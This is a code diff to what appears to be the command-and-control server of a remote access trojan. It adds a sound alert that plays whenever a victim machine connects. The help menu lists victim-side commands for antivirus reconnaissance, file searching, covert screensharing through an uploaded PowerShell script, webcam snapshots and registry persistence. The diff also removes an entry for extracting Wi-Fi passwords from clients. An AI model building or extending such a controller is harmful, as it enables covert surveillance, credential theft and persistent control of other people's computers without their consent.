@@ -6,7 +6,7 @@ import os
 import threading
 import platform
 from os.path import *
-
+import playsound
 if platform.system() == "Windows":
     clear = "cls"
 else:
@@ -410,8 +410,7 @@ def target_communication(target, ip):
                     findfiles                          --> example findfiles|txt|C:\\
                     playsound                          --> play wav file in the background (just .wav)
                     av_recon                           --> Get Infos about Av
-                    Get-Wifi                           --> Get-Wifi Function Extract Wifi Passwords from Client
-                    persistence *RegName* *fileName*   --> Create Persistence In Registry'''))
+                    persistence *RegName* *fileName*    --> Create Persistence In Registry'''))
             elif command[:11] == 'screenshare':
                 upload_file(target, 'scripts\\screenshare.ps1')
             elif command[:11] == "webcam_snap":
@@ -491,8 +490,15 @@ def accept_connections():
                 users.append(user)
                 targets.append(target)
                 ips.append(ip)
+
                 print((str(ip) + ' has connected!'))
+                cur = os.getcwd()
+
+                path = 'sounds'
+                os.chdir(path)
+                playsound.playsound("jarbou3.wav", True)
                 clients += 1
+                os.chdir(cur)
             else:
                 reliable_send(target,"quit")
                 pass
